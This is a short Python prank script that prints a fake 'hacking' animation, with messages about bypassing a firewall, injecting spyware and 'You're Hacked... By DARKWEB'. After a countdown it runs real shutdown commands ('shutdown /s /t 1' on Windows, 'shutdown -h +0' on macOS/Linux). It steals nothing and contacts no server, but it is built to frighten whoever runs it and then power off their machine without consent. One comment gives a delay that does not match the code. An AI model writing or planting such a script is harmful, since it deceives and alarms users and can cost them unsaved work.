import time
import sys
import os

def slow_type(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Fake "hacking" animation
os.system('cls' if os.name == 'nt' else 'clear')
slow_type("Initializing system breach...", 0.1)
time.sleep(1)
slow_type("Bypassing firewall... ✅", 0.07)
time.sleep(1)
slow_type("Accessing secret files... 🔍", 0.07)
time.sleep(1.5)
slow_type("Injecting payload... ☠️", 0.1)
time.sleep(2)
slow_type("Injecting SpyWare...")

# The punchline
os.system('cls' if os.name == 'nt' else 'clear')
slow_type("💥 Welcome to DaRkWeB", 0.1)
slow_type("You're Hacked... By DARKWEB...", 0.07)
slow_type("GOOD LUCK!", 0.07)

# Dramatic pause
for i in range(3, 0, -1):
    slow_type(f"System shutdown in {i}...", 0.3)
    time.sleep(1)
# REAL SHUTDOWN FUNCTION
def shutdown():
    if os.name == 'nt':  # Windows
        os.system("shutdown /s /t 1")  # Shutdown in 5 seconds
    else:  # macOS/Linux
        os.system("shutdown -h +0")  # Shutdown immediately

shutdown()